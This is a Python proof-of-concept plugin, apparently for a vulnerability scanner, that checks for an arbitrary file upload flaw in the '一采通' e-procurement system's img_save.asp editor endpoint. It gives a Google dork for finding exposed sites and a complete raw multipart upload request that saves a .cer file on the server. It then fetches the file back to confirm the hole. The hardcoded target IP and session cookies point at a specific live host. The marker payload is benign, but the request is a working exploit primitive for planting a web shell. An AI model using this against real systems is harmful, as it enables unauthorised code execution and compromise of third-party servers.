#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 一采通电子采购系统/library/editornew/Editor/img_save.asp任意文件上传 #2  

#google dork：inurl:companycglist.aspx?ComId=*

#Refer: http://www.wooyun.org/bugs/wooyun-2010-0142269
import re


def assign(service,arg):
    if service=="1caitong":
        return True,arg

def audit(arg):
    vun_url=arg+"library/editornew/Editor/img_save.asp"
    raw='''POST /library/editornew/Editor/img_save.asp HTTP/1.1
Host: 116.55.248.65:8001
Content-Length: 884
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://116.55.248.65:8001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNjZKAB66SVyL1INA
Referer: http://116.55.248.65:8001//library/editornew/Editor/temp.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASP.NET_SessionId=mvmqjx11vk1sr3uaopcqkol3; ASPSESSIONIDCQBQQATB=FKGDFMEBCLPKBNJJAPDDDDKF; VisitNum=1; a4842_pages=3; a4842_times=1; Hm_lvt_8848501857b22e6784e89c9ccb4fc9c3=1454026282; Hm_lpvt_8848501857b22e6784e89c9ccb4fc9c3=1454026343; __utma=69517648.1787092370.1454026373.1454026373.1454026373.1; __utmb=69517648.1.10.1454026373; __utmc=69517648; __utmz=69517648.1454026373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)

------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_src"; filename="123.cer"
Content-Type: application/x-x509-ca-cert

testvul
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="Submit"

提交
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_alt"


------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_align"

baseline
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_border"


------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="newid"

45
------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_hspace"


------WebKitFormBoundaryNjZKAB66SVyL1INA
Content-Disposition: form-data; name="img_vspace"


------WebKitFormBoundaryNjZKAB66SVyL1INA--
'''
    code,head,res,errcode,finalurl=curl.curl2(vun_url,raw=raw)
    match=re.search(r'getimg\(\'([\d]+.cer)\'\)',res)
    if not  match:
        return False
    verify_url=arg+"library/editornew/Editor/NewImage/"+match.group(1)
    code,head,res,errcode,finalurl=curl.curl2(verify_url)
    if code==200 and "testvul"  in res:
        security_hole('任意文件上传：'+arg+"/library/editornew/Editor/temp.asp;"+vun_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('1caitong','http://116.55.248.65:8001/')[1])